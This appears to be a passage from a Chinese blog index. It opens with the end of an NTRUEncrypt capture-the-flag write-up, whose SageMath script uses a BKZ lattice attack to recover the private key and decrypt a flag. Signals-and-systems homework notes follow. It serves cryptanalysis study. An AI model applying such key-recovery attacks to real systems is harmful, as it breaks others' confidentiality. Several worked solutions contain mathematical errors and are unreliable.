451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248e=-453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852def mul(f,g): return (f * g) % (x^n-1)def decrypt(pri_key,e): f,fp = pri_key a = bal_mod(mul(f,e),q) b = bal_mod(mul(a,fp),p) pt = ''.join([str(i) for i in b.list()]) return ptdef bal_mod(f,q): g = list(((f[i] + q//2) % q) - q//2 for i in range(n)) return Zx(g)def lattice(h,q): n = 109 # h = bal_mod(683*h,q) grid = Matrix(ZZ,2*n,2*n) cof = h.list() offset = 0 for i in range(2*n): for j in range(2*n): if i&lt;n: if j &lt; n: if i==j: grid[i,j] = 1 else: grid[i,j] = cof[(j-n-offset)%n] elif j&gt;=n and i==j: grid[i,j] = q offset += 1 GL = grid.BKZ() return GL,griddef inv_mod_prime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))GL,grid = lattice(h,q)SVP = list(GL[0])f = Zx(SVP[:n])g = Zx(SVP[-n:])a = bal_mod(mul(f,e),q)fp = inv_mod_prime(f,p)pv = (f,fp)print(decrypt(pv,e))flag = int(decrypt(pv,e)+'0'*6,2)print(flag)print(long_to_bytes(flag))end = time.time()print(end-start) 勘误维基百科中说 $m$ 转化成系数在 $[-p/2,p/2]$ 间多项式，实际应为 ${-1,0,1}$ 间。代码中加密函数原为return balancedmod(convolution(public_key,p*r) + message,q)，一般版本中的公钥是没乘 $p$ 的，在加密中才乘，但这里公钥已经乘过 $p$ 了，就可以删去。实测不删去也可正常解密，推测应该是在后面取模时消去了，读者可自行推导。 参考https://en.wikipedia.org/wiki/NTRUEncrypthttps://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sagehttps://blog.csdn.net/sinat_36742186/article/details/83689529","link":"/2022/04/11/NTRUEncrypt/"},{"title":"信号与系统笔记","text":"感觉和自动控制原理有很多重复的地方。 以作业题复习为主。 第一章 信号与系统习题 1.21先给一个 $x(t)$ 的信号图像，让你画出变换后的信号图像。基本和高中数学的函数图像变换差不多。(d) $x(4-\\frac{t}{2})$即 $x[-\\frac12(t-8)]$，先放大为 2 倍，再向右平移 8 个单位。(e) $[x(t)+x(-t)]u(t)$注意 $u(t)$ 是单位阶跃函数，即 $u(t)=1$ 当 $t\\ge0$，$u(t)=0$ 当 $t&lt;0$。所以乘上 $u(t)$ 后，信号只保留 $t\\ge0$ 的部分。(f) $x(t)\\lbrack\\delta(t+\\frac32)-\\delta(t-\\frac32))\\rbrack$$\\delta(t)$ 是单位冲激函数，这里乘 $x(t)$ 可以理解为在 $t=\\pm\\frac32$ 处分别取样，注意画图时有个箭头从 x 轴指向采样值。 习题 1.25判断下列连续时间信号的周期性；若是周期的，确定其基波周期，即最小正周期。(c) $x(t)=[\\cos(2t-\\frac\\pi3)]^2$有点考验对高中三角函数的熟悉程度，$\\cos^2\\theta=\\frac{1+\\cos2\\theta}{2}$，所以 $x(t)=\\frac12+\\frac12\\cos(4t-\\frac{2\\pi}3)$，所以是周期信号，$\\omega=4$，故基波周期 $T=\\frac{2\\pi}{\\omega}=\\frac\\pi2$。(f) $x(t) = \\sum_{n=-\\infty}^{\\infty} e^{-(2t-n)} u(2t - n)$$x(t+T) = \\sum_{n=-\\infty}^{\\infty} e^{-[2(t+T)-n]} u[2(t+T)-n] = \\sum_{n=-\\infty}^{\\infty} e^{-(2t+2T-n)} u(2t+2T-n)$令 $2T=k$，有 $x(t+k) = \\sum_{n=-\\infty}^{\\infty} e^{-(2t+k-n)} u(2t+k-n)$令 $-n’=k-n$，有 $x(t+k) = \\sum_{n’=-\\infty}^{\\infty} e^{-(2t-n’)} u(2t-n’) = x(t)$令 $2T=k=1$，所以基波周期 $T=\\frac12$。（这里是因为 $k$ 要是整数，所以 $T$ 最小只能是 $\\frac12$） 习题 1.26 判断下列离散时间信号的周期性；若是周期的，确定其基波周期。注意到离散时间信号是用中括号表示的，如 $x[n]$，而连续时间信号是用小括号表示的，如 $x(t)$。(c) $x[n] = \\cos\\left(\\frac{\\pi}{8} n^2\\right)$$x[n+N] = \\cos\\left(\\frac{\\pi}{8} (n+N)^2\\right) = \\cos\\left(\\frac{\\pi}{8} n^2 + \\frac{\\pi}{4} n N + \\frac{\\pi}{8} N^2\\right)$若 $x[n]$ 为周期信号，则 $x[n+N]=x[n]$，即 $\\frac{\\pi}{4} n N + \\frac{\\pi}{8} N^2 = 2k \\pi $（$k$ 为整数）对任意 $n$ 都成立，即 $2nN+N^2=16k$ 对任意 $n$ 都成立，则 $2N$ 和 $N^2$ 都要能被 16 整除，所以满足条件的最小 $N=8$，即基波周期 $N=8$。(e) $x[n] = 2 \\cos\\left(\\frac{\\pi}{4} n\\right) + \\sin\\left(\\frac{\\pi}{8} n\\right) - 2 \\cos\\left(\\frac{\\pi}{2} n + \\frac{\\pi}{6}\\right)$注意到三个信号的基波周期分别为 8、16、4，$x[n]$ 的基波周期就是它们的最小公倍数，即 $N=16$。 习题 1.27对下列连续时间信号，确定下列哪些性质成立，哪些不成立，并陈述理由。（1）无记忆的；（2）时不变的；（3）线性的；（4）因果的；（5）稳定的。这里解释一下这些性质的定义： 无记忆性：系统的输出只与当前时刻的输入有关，与过去和未来的输入无关。 时不变性：系统当输入信号有一个时移时，输出响应也产生同样的时移。除此之外，输出响应无任何其它变化。 线性：系统的输出对于输入信号是线性的，即对 $x_3(t) = ax_1(t) + bx_2(t)$，有 $y_3(t) = ay_1(t) + by_2(t)$。 因果性：系统在任何时刻的输出都只与当时这个时刻的输入以及该时刻以前的输入有关，而和该时刻以后的输入无关。 稳定性：系统当输入有界时，产生的输出也是有界的。 (b) $y(t)=[\\cos(3t)]x(t)$（1）由于 $y(t)$ 只与当前时刻的 $x(t)$ 有关，所以是无记忆的。（2）令 $x_1(t) = x(t - t_0)$，则$y_1(t) = (\\cos 3t)x_1(t) = (\\cos 3t)x(t - t_0) \\neq (\\cos(3t - 3t_0))x(t - t_0) = y(t - t_0)$，故系统是时变的。（3）令 $x_3(t) = ax_1(t) + bx_2(t)$，则$y_3(t) = (\\cos 3t)x_3(t) = (\\cos 3t)\\lbrack ax_1(t) + bx_2(t)\\rbrack = a(\\cos 3t)x_1(t) + b(\\cos 3t)x_2(t) = ay_1(t) + by_2(t)$，故系统是线性的。（4）因为当 $x(t) = 0, t &lt; t_a$ 时，有 $y(t) = 0, t &lt; t_c$，故系统是因果的。（5）设 $|x(t)| &lt; M$ ($M$ 为有限大小的正数)，对所有 $y(t)$ 都有 $|y(t)| &lt; M$，故系统是稳定的。(c) $y(t) = \\int_{-\\infty}^{2t} x(\\tau) \\mathrm{d}\\tau$（1）由于 $y(t)$ 由 $-\\infty$ 到 $2t$ 时刻的 $x(t)$ 决定，即 $y(t)$ 取决于 $x(t)$ 由过去到未来 $2t$ 时刻的值，故系统是有记忆的，也是非因果的。（2）令 $x_1(t) = x(t - t_0)$ 则$y_1(t) = \\int_{-\\infty}^{2t} x_1(\\tau) , d\\tau = \\int_{-\\infty}^{2t} x(t - t_0) , d\\tau \\neq \\int_{-\\infty}^{2(t - t_0)} x(\\tau) , d\\tau = y(t - t_0)$，故系统是时变的。（3）令 $x_3(t) = ax_1(t) + bx_2(t)$，则$y_3(t) = \\int_{-\\infty}^{2t} x_3(\\tau) , d\\tau = \\int_{-\\infty}^{2t} [ax_1(\\tau) + bx_2(\\tau)] , d\\tau = a \\int_{-\\infty}^{2t} x_1(\\tau) , d\\tau + b \\int_{-\\infty}^{2t} x_2(\\tau) , d\\tau = ay_1(t) + by_2(t)$，故系统是线性的。（4）上面说了，系统是非因果的。（5）设 $|x(t)| &lt; M$（$M$ 为有限大小的正数），对所有 $x(t)$ 是有界的，如 $x(t) = u(t) = \\begin{cases} 1, &amp; t &gt; 0 \\ 0, &amp; t &lt; 0 \\end{cases}$ 是有界的，但$y(t) = \\int_{-\\infty}^{2t} u(\\tau) , d\\tau = 2tu(t), \\ y(\\infty) = \\infty$ 不是有界的，故系统是不稳定的。 习题 1.31给了信号 $x_1(t)$ 及其输出 $y_1(t)$ 的图像，求 $x_2(t)$ 和 $x_3(t)$ 的图像。可以看出 $x_2(t)$ 和 $x_3(t)$ 是 $x_1(t)$ 的线性组合，利用 LTI 系统的线性特性和时不变特性即可求解。(a) $x_2(t) = x_1(t) - x_1(t-2)$，故 $y_2(t) = y_1(t) - y_1(t-2)$(b) $x_3(t) = x_1(t) + x_1(t+1)$，故 $y_3(t) = y_1(t) + y_1(t+1)$ 第二章 线性时不变系统习题 2.1设 $x[n] = \\delta[n] + 2\\delta[n-1] - \\delta[n-3]$，$h[n] = 2\\delta[n+1] + 2\\delta[n-1]$，计算下列卷积：(a) $y_1[n]=x[n]\\ast h[n]$$$\\begin{align*}y_1[n] &amp;= x[n] * h[n] = \\sum_{k=-\\infty}^{\\infty} x[k] h[n - k] \\\\ &amp;= \\sum_{k=-\\infty}^{\\infty} x[n - k] h[k] = h[-1] x[n + 1] + h[1] x[n - 1] \\\\ &amp;= 2 x[n + 1] + 2 x[n - 1] \\\\ &amp;= 2 \\delta[n + 1] + 4 \\delta[n] - 2 \\delta[n - 2] + 2 \\delta[n - 1] + 4\\delta[n-2] - 2\\delta[n-4]\\\\ &amp;= 2 \\delta[n + 1] + 4 \\delta[n] + 2 \\delta[n - 1] + 2 \\delta[n - 2] - 2\\delta[n-4]\\end{align*}$$(b) $y_2[n]=x[n+2]\\ast h[n]$$$\\begin{align*}y_2[n] &amp;= x[n + 2] * h[n] \\\\ &amp;= \\sum_{k=-\\infty}^{\\infty} x[n - k + 2] h[k] = y_1[n + 2] \\\\ &amp;= 2 \\delta[n + 3] + 4 \\delta[n + 2] + 2 \\delta[n + 1] + 2 \\delta[n] - 2 \\delta[n - 2]\\end{align*}$$(c) $y_3[n]=x[n]\\ast h[n+2]$$$\\begin{align*}y_3[n] &amp;= x[n] * h[n + 2] \\\\ &amp;= \\sum_{k=-\\infty}^{\\infty} x[k] h[n - k + 2] \\\\ &amp;= y_1[n + 2] = y_2[n]\\end{align*}$$ 习题 2.10假设 $x(t) =\\begin{cases}1, &amp; 0 \\leq t \\leq 1 \\\\0, &amp; \\text{其他}\\end{cases}$ 和 $h(t) = x\\left(\\frac{t}{a}\\right), \\quad 0 \\leq a \\leq 1$。 (a) 求出并画出 $y(t) = x(t) \\ast h(t)$;(b) 若 $\\frac{dy(t)}{\\mathrm{d}t}$ 仅含有三个不连续点，$a$ 值为多少？ 习题 2.11令$$x(t)=u(t-3)-u(t-5)，h(t)=e^{-3t}u(t)$$(a) 计算 $y(t)=x(t)*h(t)$$$y(t) = x(t) * h(t) = \\int_{-\\infty}^{\\infty} x(\\tau) h(t - \\tau) d\\tau$$ $$= \\int_{-\\infty}^{\\infty} u(\\tau - 3) e^{-3(t-\\tau)} u(t - \\tau) d\\tau - \\int_{-\\infty}^{\\infty} u(\\tau - 5) e^{-3(t-\\tau)} u(t - \\tau) d\\tau$$ $$= \\int_3^{t} e^{-3t} e^{3\\tau} d\\tau - \\int_5^{t} e^{-3t} e^{3\\tau} d\\tau$$ $$= e^{-3t} \\left[ \\frac{1}{3}(e^{3t}-e^9)u(t-3) -\\frac{1}{3}(e^{3t}-e^{15})u(t-5) \\right]$$ $$= \\frac{1}{3} [1 - e^{-3(t-3)}] u(t - 3) - \\frac{1}{3} [1 - e^{-3(t-5)}] u(t - 5)$$ $$= \\begin{cases}0, &amp; t \\leqslant 3 \\\\frac{1}{3} [1 - e^{-3(t-3)}], &amp; 3 &lt; t \\leqslant 5 \\\\frac{1}{3} (1 - e^{-6}) e^{-3(t-5)}, &amp; t &gt; 5\\end{cases}$$(b) 计算 $g(t)=[\\mathrm{d}x(t)/\\mathrm{d}t]*h(t)$注意到 $u(t)$ 的导数是 $\\delta(t)$，所以 $g(t) = [\\delta(t-3) - \\delta(t-5)]*h(t)$。$$\\frac{dx(t)}{dt} = \\delta(t - 3) - \\delta(t - 5)$$ $$g(t) = \\frac{dx(t)}{dt} * h(t) = [\\delta(t - 3) - \\delta(t - 5)] * e^{-3t} u(t)$$ $$= e^{-3(t - 3)} u(t - 3) - e^{-3(t - 5)} u(t - 5)$$ (c) $g(t)$ 与 $y(t)$ 有什么关系？$$\\frac{dy(t)}{dt} = \\frac{1}{3} [1 - e^{-3(t - 3)}] \\delta(t - 3) + e^{-3(t - 3)} u(t - 3)$$ $$-\\frac{1}{3} [1 - e^{-3(t - 5)}] \\delta(t - 5) - e^{-3(t - 5)} u(t - 5)$$ $$= e^{-3(t - 3)} u(t - 3) - e^{-3(t - 5)} u(t - 5)$$ $$g(t) = \\frac{dy(t)}{dt}$$ 习题 2.20求下列积分：(a) $\\int_{-\\infty}^{\\infty} u_0(t) \\cos(t) , \\mathrm{d}t$(b) $\\int_{0}^{5} \\sin(2\\pi t)\\delta(t+3) , \\mathrm{d}t$(c) $\\int_{-5}^{5} u_1(1-t)\\cos(2\\pi \\tau) , \\mathrm{d}\\tau$ 习题 2.21计算下列各对信号的卷积 $y[n]=x[n]*h[n]$(a)$$\\begin{cases}x[n] = \\alpha^n u[n] \\\\h[n] = \\beta^n u[n]\\end{cases}$$$\\alpha \\neq \\beta$$$y[n] = x[n] * h[n] = \\sum_{k=-\\infty}^{\\infty} x[k] h[n - k]$$ $$= \\sum_{k=-\\infty}^{\\infty} \\alpha^k u[k] \\beta^{n-k} u[n - k] = \\sum_{k=0}^{n} \\left( \\alpha/\\beta \\right)^k \\cdot \\beta^n$$ $$= \\beta^n \\cdot \\frac{1 - \\left( \\alpha/\\beta \\right)^{n+1}}{1 - \\alpha/\\beta} u[n]$$ $$= \\frac{\\beta^{n+1} - \\alpha^{n+1}}{\\beta - \\alpha} u[n] \\quad (\\alpha \\neq \\beta, n \\geqslant 0)$$(b) $ x[n] = h[n] = \\alpha^n u[n] $(c) $ x[n] = \\left(-\\frac{1}{2}\\right)^n u[n-4] $， $ h[n] = 4^n u[2-n] $(d) $ x[n] $ 和 $ h[n] $ 如图 P2.21 所示。 第三章 周期信号的傅里叶级数表示 一开始挺奇怪第三章怎么和第四五章内容重复，仔细一看才发现这章只是傅里叶级数，不是变换。 习题 3.21有一个连续时间周期信号 $x(t)$ 是实值信号，其基波周期 $T=8$，$x(t)$ 的非零傅里叶级数系统为 $a_1=a_{-1}^*=\\mathrm{j}, a_5=a_{-5}=2$，试将 $x(t)$ 表示为如下形式：$$x(t)=\\sum_{k=0}^{\\infty}A_k\\cos(\\omega_kt+\\phi_k)$$$$\\begin{align*}x(t) &amp;= \\sum_{k=-\\infty}^{\\infty} a_k e^{\\mathrm{j}k\\omega_0 t} = \\sum_{k=-\\infty}^{\\infty} a_k e^{\\mathrm{j}k(2\\pi/8)t} \\\\ &amp;= a_1 e^{\\mathrm{j}(2\\pi/8)t} + a_{-1} e^{-\\mathrm{j}(2\\pi/8)t} + a_5 e^{\\mathrm{j}5(2\\pi/8)t} + a_{-5} e^{-\\mathrm{j}5(2\\pi/8)t} \\\\ &amp;= \\mathrm{j} e^{\\mathrm{j}(\\pi/4)t} - \\mathrm{j} e^{-\\mathrm{j}(\\pi/4)t} + 2 e^{\\mathrm{j}5(\\pi/4)t} + 2 e^{-\\mathrm{j}5(\\pi/4)t} \\\\ &amp;= -2\\sin\\left(\\frac{\\pi}{4} t\\right) + 4 \\cos\\left(\\frac{5\\pi}{4} t\\right) \\\\ &amp;= 2 \\cos\\left(\\frac{\\pi}{4} t + \\frac{\\pi}{2}\\right) + 4 \\cos\\left(\\frac{5\\pi}{4} t\\right)\\end{align*}$$ 习题 3.22求下列信号的傅里叶级数表示：(b) $x(t)$ 的周期为 $2$，且 $x(t)=e^{-t}, -1&lt;t&lt;1$$$\\begin{align*}T &amp;= 2, \\quad \\omega_0 = \\frac{2\\pi}{2} = \\pi \\\\a_0 &amp;= \\frac{1}{T} \\int_{T} x(t) , \\mathrm{d}t = \\frac{1}{2} \\left( \\int_{-1}^{1} e^{-t} , \\mathrm{d}t \\right) = \\frac{1}{2} (e - e^{-1}) \\\\a_k &amp;= \\frac{1}{T} \\int_{T} x(t) e^{-\\mathrm{j}k\\omega_0 t} , \\mathrm{d}t = \\frac{1}{2} \\int_{-1}^{1} e^{-t} e^{-\\mathrm{j}k\\pi t} , \\mathrm{d}t = \\frac{1}{2} \\left( \\frac{e^{-(1+\\mathrm{j}k)\\pi} - e^{(1-\\mathrm{j}k)\\pi}}{1 + \\mathrm{j}k\\pi} \\right) \\\\&amp;= \\frac{1}{2(1 + \\mathrm{j}k\\pi)} \\left[ e^{(1+\\mathrm{j}k\\pi)} - e^{-(1+\\mathrm{j}k\\pi)} \\right] \\\\&amp;= \\frac{(-1)^k}{2(1 + \\mathrm{j}k\\pi)} (e - e^{-1}), \\quad k \\ne 0 \\\\&amp;\\lim_{k \\to 0} a_k = \\frac12(e-e^{-1}) = a_0 \\\\x(t) &amp;= \\sum_{k=-\\infty}^{\\infty} a_k e^{\\mathrm{j}k\\pi t} = \\sum_{k=-\\infty}^{\\infty} \\frac{(-1)^k}{2(1 + \\mathrm{j}k\\pi)} (e - e^{-1}) e^{\\mathrm{j}k\\pi t}\\end{align*}$$ 习题 3.25下面三个连续时间周期信号的基波周期 $T=\\frac12$：$x(t)=\\cos(4\\pi t), y(t)=\\sin(4\\pi t), z(t)=x(t)y(t)$(a) 求 $x(t)$ 的傅里叶级数系数。因 $T = 1/2$，$\\omega_0 = 2\\pi / \\frac{1}{2} = 4\\pi$，故$$x(t) = \\frac{1}{2} \\left( e^{\\mathrm{j}4\\pi t} - e^{-\\mathrm{j}4\\pi t} \\right) = \\sum_{k=-\\infty}^{\\infty} a_k e^{\\mathrm{j}k(4\\pi) t}$$其中 $a_1 = a_{-1} = 1/2$，其余 $a_k = 0$。 (b) 求 $y(t)$ 的傅里叶级数系数。利用欧拉公式对 $ \\sin $ 函数展开，有：$$y(t) = \\frac{1}{2\\mathrm{j}} \\left( e^{\\mathrm{j}4\\pi t} - e^{-\\mathrm{j}4\\pi t} \\right) = \\sum_{k=-\\infty}^{\\infty} b_k e^{\\mathrm{j}k(4\\pi) t}$$其中 $b_1 = -\\frac{1}{2}\\mathrm{j}, b_{-1} = \\frac{1}{2}\\mathrm{j}$，其余 $b_k = 0$。 (c) 利用 (a) 和 (b) 的结果，按照连续时间傅里叶级数的相乘性质，求 $z(t) = x(t) y(t)$ 的傅里叶级数系数。$$z(t) = x(t)y(t) \\stackrel{\\text{FS}}{\\longleftrightarrow} c_k = \\sum_{l=-\\infty}^{\\infty} a_l b_{k-l}$$其中$$c_k = \\sum_{n=-\\infty}^{\\infty} a_n b_{k-n} = \\left( \\frac{1}{2} \\right) \\left( \\frac{1}{2\\mathrm{j}} [k+1] + \\left(-\\frac{1}{2\\mathrm{j}}\\right) [k-1] \\right) = \\frac{1}{4\\mathrm{j}} \\delta[k+1] + \\frac{1}{4\\mathrm{j}} \\delta[k-1]$$即 $c_{-2} = \\frac{1}{4\\mathrm{j}}$，$c_2 = -\\frac{1}{4\\mathrm{j}}$，其余 $c_k = 0$。 (d) 通过直接将 $z(t)$ 展开成三角函数的形式，求 $z(t)$ 的傅里叶级数系数，并与 (c) 的结果进行比较。 直接对 $z(t)$ 化简可得：$$z(t) = \\cos(4\\pi t) \\sin(4\\pi t) = \\frac{1}{2} \\sin(8\\pi t)$$即$$c_2 = \\frac{1}{4\\mathrm{j}}，c_{-2} = -\\frac{1}{4\\mathrm{j}}， \\text{其余} , c_k = 0。$$ 习题 3.34 考虑一个连续时间线性时不变系统，其单位冲激响应为$$h(t) = e^{-4|t|}$$ 对于下列各输入情况下，求输出 $y(t)$ 的傅里叶级数表示： (a) $x(t) = \\sum_{n=-\\infty}^{+\\infty} \\delta(t - n)$ (c) $x(t)$ 为如图 P3.34 所示的周期性方波。 习题 3.38考虑一个离散时间线性时不变系统，其单位脉冲响应为$$h[n] =\\begin{cases}1, &amp; 0 \\leqslant n \\leqslant 2 \\-1, &amp; -2 \\leqslant n \\leqslant -1 \\0, &amp; \\text{其他}\\end{cases}$$ 已知系统的输入是$$x[n] = \\sum_{k=-\\infty}^{+\\infty} \\delta[n - 4k]$$ 求输出 $y[n]$ 的傅里叶级数系数。 第四章 连续时间傅里叶变换习题 4.1利用傅里叶变换分析式(4.9)，求下列信号的傅里叶变换： (a) $ e^{-2(t-1)} u(t-1) $由常见傅里叶变换对$$e^{-\\alpha t} u(t) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} \\frac{1}{\\alpha + \\mathrm{j}\\omega}$$可知$$e^{-2t} u(t) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} \\frac{1}{2 + \\mathrm{j}\\omega}$$又由时移性质 $x(t - t_0) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} e^{-\\mathrm{j}\\omega t_0} X(\\mathrm{j}\\omega)$，可得$$X(\\mathrm{j}\\omega) = \\frac{e^{-\\mathrm{j}\\omega}}{2 + \\mathrm{j}\\omega}$$ (b) $ e^{-2|t-1|} $这个需要拆分成两个部分，分别求傅里叶变换，再合并。$$e^{-2|t-1|} = e^{-2(t-1)} u(t-1) + e^{2(t-1)} u(1-t)$$ 那么有$$e^{-2(t-1)} u(t-1) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} \\frac{e^{-\\mathrm{j}\\omega}}{2 - \\mathrm{j}\\omega} + \\frac{e^{-\\mathrm{j}\\omega}}{2 + \\mathrm{j}\\omega}$$ 概略画出每一个傅里叶变换的模特性并给以标注。 习题 4.2利用傅里叶变换分析式(4.9)，求下列信号的傅里叶变换： (a) $ \\delta(t+1) + \\delta(t-1) $ $\\delta(t)$ 的傅里叶变换为 $1$，所以结合时移性质，有$$\\delta(t+1) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} e^{\\mathrm{j}\\omega} \\quad \\delta(t-1) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} e^{-\\mathrm{j}\\omega}$$又由欧拉公式 $e^{\\mathrm{j}\\theta} = \\cos\\theta + \\mathrm{j}\\sin\\theta$，可得$$\\delta(t+1) + \\delta(t-1) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} 2\\cos\\omega$$ (b) $ \\frac{d}{dt} \\left[ u(-2-t) + u(t-2) \\right] $ $u(t)$ 的导数就是 $\\delta(t)$，所以有 $$\\frac{d}{dt} u(-2-t) = -\\delta(t+2) \\quad \\frac{d}{dt} u(t-2) = \\delta(t-2)$$不难类似上题得到$$X(\\mathrm{j}\\omega) = e^{-2\\mathrm{j}\\omega} - e^{2\\mathrm{j}\\omega} = -2\\mathrm{j} \\sin 2\\omega$$ 概略画出每一个傅里叶变换的模特性并给以标注。 习题 4.26(a) 利用卷积性质和逆变换，用计算 $X(\\mathrm{j}\\omega)$ 和 $H(\\mathrm{j}\\omega)$ 求下列各对信号 $x(t)$ 和 $h(t)$ 的卷积： 注意这里提到的性质就是 $y(t) = x(t) * h(t) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} Y(\\mathrm{j}\\omega) = X(\\mathrm{j}\\omega)H(\\mathrm{j}\\omega)$。 (1) $x(t) = te^{-2t}u(t), \\quad h(t) = e^{-4t}u(t)$由常见傅里叶变换对$$t e^{-\\alpha t} u(t) \\stackrel{\\mathcal{F}}{\\longleftrightarrow} \\frac{1}{(\\alpha + \\mathrm{j}\\omega)^2}$$可得$$X(\\mathrm{j}\\omega) = \\frac{1}{(2 + \\mathrm{j}\\omega)^2}$$$$H(\\mathrm{j}\\omega) = \\frac{1}{4 + \\mathrm{j}\\omega}$$有$$Y(\\mathrm{j}\\omega) = \\frac{1}{(2 + \\mathrm{j}\\omega)^2} \\cdot \\frac{1}{4 + \\mathrm{j}\\omega} = \\frac{1/4}{4 + \\mathrm{j}\\omega} - \\frac{1/4}{2 + \\mathrm{j}\\omega} + \\frac{1/2}{(2 + \\mathrm{j}\\omega)^2}$$逆变换得$$y(t) = \\frac{1}{4} e^{-4t} u(t) - \\frac{1}{4} e^{-2t} u(t) + \\frac{1}{2} te^{-2t} u(t)$$ (2) $x(t) = te^{-2t}u(t), \\quad h(t) = te^{-4t}u(t)$ (3) $x(t) = e^{-t}u(t), \\quad h(t) = e^{t}u(-t)$ (b) 假设 $x(t) = e^{-(t-2)}u(t-2)$，如图 P4.26 所示，对这一对信号，通过证明 $y(t) = x(t) * h(t)$ 的傅里叶变换等于 $H(\\mathrm{j}\\omega)X(\\mathrm{j}\\omega)$ 来验证卷积性质。 习题 4.33一个因果线性时不变系统的输入和输出，由下列微分方程表征： $$\\frac{d^2 y(t)}{dt^2} + 6\\frac{dy(t)}{dt} + 8y(t) = 2x(t)$$ (a) 求该系统的单位冲激响应。 其实和拉普拉斯变换基本差不多，就是把拉普拉斯的 $s$ 换成 $\\mathrm{j}\\omega$ 了微分方程的拉普拉斯变换为$$(s^2 + 6s + 8)Y(s) = 2X(s)$$所以$$H(\\mathrm{j}\\omega) = \\frac{Y(\\mathrm{j}\\omega)}{X(\\mathrm{j}\\omega)} = \\frac{1}{\\mathrm{j}\\omega + 2} - \\frac{1}{\\mathrm{j}\\omega + 4}$$故单位冲激响应为$$h(t) = e^{-2t}u(t) - e^{-4t}u(t)$$ (b) 若 $x(t) = te^{-2t}u(t)$，该系统的响应是什么？$$Y(\\mathrm{j}\\omega) = H(\\mathrm{j}\\omega)X(\\mathrm{j}\\omega) = \\left( \\frac{1}{\\mathrm{j}\\omega + 2} - \\frac{1}{\\mathrm{j}\\omega + 4} \\right) \\cdot \\frac{1}{(2 + \\mathrm{j}\\omega)^2} = \\frac{1/4}{\\mathrm{j}\\omega + 2} - \\frac{1/4}{\\mathrm{j}\\omega + 4} + \\frac{-1/2}{(\\mathrm{j}\\omega + 2)^2} + \\frac{1}{(\\mathrm{j}\\omega + 2)^3}$$再取逆变换即可得到$$y(t) = \\frac{1}{4} e^{-2t} u(t) - \\frac{1}{4} e^{-4t} u(t) - \\frac{1}{2} te^{-2t} u(t) + \\frac{1}{2} e^{-2t} u(t)$$ (c) 对于由下列方程描述的因果线性时不变系统，重做 (a)： $$\\frac{d^2 y(t)}{dt^2} + \\sqrt{2}\\frac{dy(t)}{dt} + y(t) = 2\\frac{d^2 x(t)}{dt^2} - 2x(t)$$其拉式变换为$$(s^2 + \\sqrt{2}s + 1)Y(s) = 2(s^2 - 1)X(s)$$傅里叶变换为$$(\\mathrm{j}\\omega + \\sqrt{2})^2 Y(\\mathrm{j}\\omega) = 2(-\\omega^2 - 1)X(\\mathrm{j}\\omega)$$进而可以求得系统函数 $H(\\mathrm{j}\\omega)$，再求逆变换即可得到单位冲激响应，不再赘述。 习题 4.44一个因果线性时不变系统的输入 $x(t)$ 和输出 $y(t)$ 的关系由下列方程给出： $$\\frac{dy(t)}{dt} + 10y(t) = 